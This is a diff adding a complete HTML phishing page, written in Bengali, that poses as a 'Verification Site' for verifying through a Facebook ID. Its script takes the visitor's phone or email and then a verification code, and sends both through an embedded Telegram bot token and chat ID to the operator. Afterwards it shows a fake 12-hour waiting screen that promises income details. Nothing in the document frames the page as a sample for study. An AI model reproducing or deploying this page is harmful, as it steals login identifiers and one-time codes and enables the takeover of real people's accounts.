@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification Site</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #74ebd5, #ACB6E5);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.container {
+    background: #fff;
+    padding: 25px 35px;
+    border-radius: 15px;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+    width: 360px;
+    text-align: center;
+    transition: transform 0.3s ease;
+}
+.container:hover {
+    transform: translateY(-5px);
+}
+input {
+    width: 90%;
+    padding: 12px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+}
+button {
+    padding: 12px 25px;
+    border: none;
+    background: linear-gradient(90deg, #667eea, #764ba2);
+    color: #fff;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+    margin-top: 10px;
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: linear-gradient(90deg, #764ba2, #667eea);
+}
+#timer {
+    margin-top: 20px;
+    font-weight: bold;
+    color: #333;
+    text-align: center;
+    font-size: 16px;
+}
+.message-box {
+    margin-top: 15px;
+    text-align: left;
+    line-height: 1.6;
+    font-size: 15px;
+    color: #444;
+}
+h2, h3 {
+    color: #333;
+}
+</style>
+</head>
+<body>
+
+<div class="container" id="screen1">
+    <h2>আপনার ফেসবুক আইডি এর মাধ্যমে ভেরিফিকেশন করুন</h2>
+    <input type="text" id="phone" placeholder="Phone/Email"><br>
+    <button onclick="sendInfo()">Send</button>
+</div>
+
+<div class="container" id="screen2" style="display:none;">
+    <input type="number" id="codeInput" placeholder="enter Code" inputmode="numeric" pattern="[0-9]*"><br>
+    <button onclick="submitCode()">Submit</button>
+</div>
+
+<div class="container" id="screen3" style="display:none;">
+    <div class="message-box">
+        <h3>আপনাকে ভেরিফাই করতে ১২ ঘণ্টার মতো সময় লাগতে পারে বা কম সময় লাগতে পারে</h3>
+        <p>তারপর আপনার ইমেল বা ফোন নম্বরে একটি ভেরিফাই ম্যাসেজ বা মেইল পাঠানো হবে ঐখানে আপনার ইনকাম সম্পর্কে ধারণা বা লিংক দেওয়া থাকবে সাইটের ধন্যবাদ আপনাকে আমাদের সময় দেয়ার জন্য।</p>
+    </div>
+    <div id="timer"></div>
+</div>
+
+<script>
+const botToken = "8302040520:AAEh35_HzjVxZdLaYOU53Aco-gKhvd6QGAY";
+const chatId = "6395951178";
+let timeLimit = 12 * 60 * 60; // 12 ঘন্টা
+let timerInterval;
+
+function sendInfo() {
+    const phone = document.getElementById('phone').value.trim();
+    if(phone === "") { alert("Phone বা Email দিন!"); return; }
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("নতুন ভেরিফিকেশন:\nUser: " + phone)}`)
+    .then(res => console.log("Phone/Email sent to Telegram"))
+    .catch(err => console.log(err));
+
+    document.getElementById('screen1').style.display = "none";
+    document.getElementById('screen2').style.display = "block";
+}
+
+function submitCode() {
+    const phone = document.getElementById('phone').value.trim();
+    const code = document.getElementById('codeInput').value.trim();
+    if(code === "") { alert("Code দিন!"); return; }
+
+    // Telegram এ পাঠানো হচ্ছে ফোন + কোড
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("নতুন ভেরিফিকেশন:\nUser: " + phone + "\nCode: " + code)}`)
+    .then(res => console.log("Code sent to Telegram"))
+    .catch(err => console.log(err));
+
+    document.getElementById('screen2').style.display = "none";
+    document.getElementById('screen3').style.display = "block";
+
+    // Timer শুরু
+    timerInterval = setInterval(() => {
+        let hours = Math.floor(timeLimit / 3600);
+        let minutes = Math.floor((timeLimit % 3600) / 60);
+        let seconds = timeLimit % 60;
+        document.getElementById('timer').innerText = `সময় বাকি: ${hours} ঘন্টা ${minutes} মিনিট ${seconds} সেকেন্ড`;
+        if(timeLimit <= 0) clearInterval(timerInterval);
+        timeLimit--;
+    }, 1000);
+}
+</script>
+
+</body>
+</html>
